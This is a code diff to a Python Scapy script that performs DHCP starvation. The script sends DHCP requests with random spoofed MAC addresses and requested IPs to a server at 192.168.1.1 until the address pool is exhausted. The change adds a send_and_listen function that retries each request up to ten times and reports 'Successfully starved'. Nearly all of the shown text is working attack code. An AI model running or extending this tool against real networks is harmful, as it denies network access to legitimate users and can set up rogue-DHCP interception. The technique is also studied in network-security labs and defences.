@@ -4,7 +4,6 @@ import ipaddress
 from threading import Thread
 from time import sleep
 
-
 class SpoofedPacket():
     def __init__(self, src_mac, spoof_ip):
         self.src_mac = src_mac
@@ -21,8 +20,17 @@ class SpoofedPacket():
             /DHCP(options=[('message-type', 'request'), ("requested_addr", self.spoof_ip), ('server_id', '192.168.1.1'), 'end'])
         return dhcp_r_packet
 
-def ack_listener():
-    
+def send_and_listen(packet, ip):
+    for i in range(10):
+        ans = srp1(packet.dhcp_request, timeout=.2)
+        if ans is not None:
+            print('['+str(ip)+'] - Successfully starved')
+            break
+        else:
+            if i == 9:
+                print('[-] Could not starve')
+            else:
+                pass
 
 def main():
     parser = argparse.ArgumentParser(description='Get arguments')
@@ -39,7 +47,7 @@ def main():
             print("Starving "+ str(ip))
             mac = RandMAC()
             packet = SpoofedPacket(mac, ip)
-            srp1(packet.dhcp_request, timeout=1)
+            send_and_listen(packet, ip)
 
 
 
